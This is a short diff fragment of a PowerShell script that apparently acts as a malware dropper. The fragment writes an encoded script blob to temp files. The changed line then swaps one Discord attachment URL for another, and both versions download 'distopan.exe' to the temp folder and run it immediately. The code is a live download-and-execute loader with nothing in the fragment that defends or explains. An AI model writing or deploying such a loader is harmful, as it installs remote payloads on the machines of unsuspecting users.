@@ -35,7 +35,7 @@ $TempFile = "$env:TEMP\temp.ps1"; $File = "$env:TEMP\l.ps1"; echo 77u/JElzQWRtaW
 
 
 #Disto
-Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/895907015614930984/1269404538507624539/distopan.exe?ex=66aff09a&is=66ae9f1a&hm=e4c0b2d1bb1d77c0e21346cee072dec87ac72cf59ab04a74a9877bd3ebe2542b&" -OutFile "$env:temp\distopi.exe"; powershell "$env:temp\distopi.exe";
+Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/895907015614930984/1269444822612181054/distopan.exe?ex=66b0161e&is=66aec49e&hm=1e4d002fc89f532ae6b53f298bcacf892700f1e8137fa1f43cafcab59bdd8591&" -OutFile "$env:temp\distopi.exe"; powershell "$env:temp\distopi.exe";
 
 Start-Sleep -Seconds 5;
 
